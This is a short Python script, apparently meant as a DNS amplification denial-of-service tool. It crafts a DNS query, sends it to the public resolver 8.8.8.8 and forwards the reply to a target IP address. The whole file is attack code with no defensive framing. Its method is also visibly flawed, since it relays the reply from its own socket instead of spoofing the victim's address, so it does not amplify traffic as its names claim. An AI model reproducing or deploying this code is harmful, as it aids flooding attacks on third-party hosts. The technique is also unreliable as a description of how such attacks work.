import socket

def create_dns_query(domain):
    transaction_id = b'\xaa\xaa'
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    query_name = b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'
    query_type = b'\x00\x01'
    query_class = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query_name + query_type + query_class

def send_amplified_request(target_ip, dns_server, domain):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        query = create_dns_query(domain)
        sock.sendto(query, (dns_server, 53))
        response, _ = sock.recvfrom(4096)
        print(f"Received response from DNS server: {len(response)} bytes")
        sock.sendto(response, (target_ip, 53))
        print(f"Sent amplified response to target: {target_ip}")
    except socket.timeout:
        print("No response from DNS server")
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target_ip = "192.0.2.1"
    dns_server = "8.8.8.8"
    domain = "example.com"
    send_amplified_request(target_ip, dns_server, domain)